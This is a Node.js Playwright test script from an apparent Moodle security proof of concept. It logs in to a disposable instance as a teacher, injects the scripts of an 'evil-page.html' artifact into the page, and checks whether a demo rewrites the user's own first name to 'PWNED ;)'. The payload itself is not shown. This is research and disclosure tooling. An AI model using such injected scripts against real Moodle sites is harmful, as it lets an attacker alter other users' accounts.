// SPDX-License-Identifier: MIT
//
// Live check for the canonical poc/evil-page.html artifact. It logs in to a
// disposable Moodle as a non-admin, injects the same body and inline scripts a
// trusted mod_page stores, verifies that the current probe and both Moodle
// action buttons mount, and explicitly clicks only the own-profile demo.
//
// Env: MOODLE_BASE (default http://localhost), PAGE_USER (default teacher_demo),
//      PAGE_PASS (default Demo!2026), OUT (json path), PAGE_DRY_RUN=1 (mount only).
// Run: node evidencias/page-html-test.cjs

const fs = require('fs');
const path = require('path');
const { chromium } = require('playwright');

const BASE = (process.env.MOODLE_BASE || 'http://localhost').replace(/\/$/, '');
const USER = process.env.PAGE_USER || 'teacher_demo';
const PASS = process.env.PAGE_PASS || 'Demo!2026';
const DRY_RUN = process.env.PAGE_DRY_RUN === '1';
const OUT = process.env.OUT || path.join(__dirname, 'resultados-page-html.json');
const HTML = fs.readFileSync(path.join(__dirname, '..', 'poc', 'evil-page.html'), 'utf8');
const BODY = (HTML.match(/<body[^>]*>([\s\S]*?)<\/body>/i) || [, ''])[1];
const SCRIPTS = [...BODY.matchAll(/<script[^>]*>([\s\S]*?)<\/script>/gi)].map((m) => m[1]);
const MARKUP = BODY.replace(/<script[^>]*>[\s\S]*?<\/script>/gi, '');

(async () => {
  const browser = await chromium.launch();
  const ctx = await browser.newContext({ baseURL: BASE });
  const page = await ctx.newPage();
  const out = {
    base: BASE, user: USER, htmlBytes: HTML.length,
    inlineScripts: SCRIPTS.length,
  };

  await page.goto('/login/index.php', { waitUntil: 'networkidle' });
  await page.fill('#username', USER);
  await page.fill('#password', PASS);
  await Promise.all([page.waitForLoadState('domcontentloaded'), page.click('#loginbtn')]);
  out.loggedIn = !/login\/index\.php/.test(page.url());
  if (!out.loggedIn) {
    out.error = 'login failed for ' + USER;
    fs.writeFileSync(OUT, JSON.stringify(out, null, 2) + '\n');
    await browser.close();
    process.exit(3);
  }

  await page.goto('/my/', { waitUntil: 'domcontentloaded' });
  const readProfile = () => page.evaluate(async () => {
    const uid = window.M.cfg.userId;
    const html = await (await fetch('/user/edit.php?id=' + uid, {
      credentials: 'same-origin',
    })).text();
    const doc = new DOMParser().parseFromString(html, 'text/html');
    const firstname = doc.querySelector('input[name=firstname]');
    return { uid, firstname: firstname ? firstname.value : null };
  });
  out.before = await readProfile();

  await page.evaluate((markup) => {
    const host = document.createElement('div');
    host.id = 'poc-safe-page-html-test';
    host.innerHTML = markup;
    document.body.appendChild(host);
  }, MARKUP);
  for (const script of SCRIPTS) await page.addScriptTag({ content: script });

  await page.waitForSelector('[data-demo="moodle-own-user"]');
  out.probeRan = await page.evaluate(() => Boolean(window.__EXE_POC_RESULT));
  out.host = await page.evaluate(() => window.__EXE_POC_HOST || null);
  out.runtime = await page.evaluate(() => ({
    allowSelfHost: window.__EXE_POC_ALLOW_SELF_HOST === true,
    topLevel: window.parent === window,
    bodyId: document.body && document.body.id,
    hasMcfg: Boolean(window.M && window.M.cfg),
    canReadHostDocument: Boolean(
      window.__EXE_POC_RESULT && window.__EXE_POC_RESULT.canReadParentDocument
    ),
  }));
  out.measurementTable = await page.evaluate(() => ({
    visible: Boolean(document.querySelector('[data-exe-probe-medido]:not([hidden])')),
    rows: document.querySelectorAll('[data-exe-probe-row]').length,
    verdict: document.querySelector('[data-exe-probe-verdict-title]')?.textContent || null,
  }));
  out.buttons = await page.locator('[data-exe-probe-demo-host="moodle"] [data-demo]')
    .evaluateAll((nodes) => nodes.map((node) => node.getAttribute('data-demo')));

  if (DRY_RUN) {
    out.dryRun = true;
    fs.writeFileSync(OUT, JSON.stringify(out, null, 2) + '\n');
    console.log(JSON.stringify({
      user: USER,
      probeRan: out.probeRan,
      host: out.host && out.host.id,
      measurementTable: out.measurementTable,
      buttons: out.buttons,
      dryRun: true,
    }, null, 2));
    await browser.close();
    return;
  }

  await page.click('[data-demo="moodle-own-user"]');
  await page.waitForFunction(() => (
    window.__EXE_POC_LAST_DEMO &&
    window.__EXE_POC_LAST_DEMO.id === 'moodle-own-user'
  ), null, { timeout: 30000 });
  out.demo = await page.evaluate(() => window.__EXE_POC_LAST_DEMO);
  out.after = await readProfile();
  out.nameChanged = out.after.firstname === 'PWNED ;)';

  fs.writeFileSync(OUT, JSON.stringify(out, null, 2) + '\n');
  console.log(JSON.stringify({
    user: USER,
    probeRan: out.probeRan,
    host: out.host && out.host.id,
    buttons: out.buttons,
    before: out.before.firstname,
    after: out.after.firstname,
    nameChanged: out.nameChanged,
    demoState: out.demo && out.demo.state,
  }, null, 2));
  await browser.close();
})().catch((e) => {
  console.error('FATAL', e);
  process.exit(2);
});
